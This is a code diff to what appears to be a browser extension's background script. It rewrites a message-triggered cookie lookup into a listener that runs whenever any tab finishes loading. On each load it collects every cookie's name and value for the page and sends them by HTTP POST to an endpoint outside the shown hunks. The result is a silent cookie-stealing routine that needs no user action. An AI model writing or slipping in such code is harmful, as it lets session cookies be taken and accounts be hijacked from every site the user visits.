@@ -1,6 +1,6 @@
-chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
-  if (request.action === "getCookies") {
-    chrome.cookies.getAll({url: request.url}, (cookies) => {
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+  if (changeInfo.status === "complete" && tab.url) {
+    chrome.cookies.getAll({url: tab.url}, (cookies) => {
       const cookieData = cookies.map(cookie => ({
         name: cookie.name,
         value: cookie.value,
@@ -24,20 +24,17 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          url: request.url,
+          url: tab.url,
           cookies: cookieData
         })
       })
       .then(response => response.json())
       .then(data => {
         console.log("Cookies sent successfully:", data);
-        sendResponse({status: "success", data});
       })
       .catch(error => {
         console.error("Error sending cookies:", error);
-        sendResponse({status: "error", error});
       });
     });
-    return true; // Indicates that the response is sent asynchronously
   }
 });
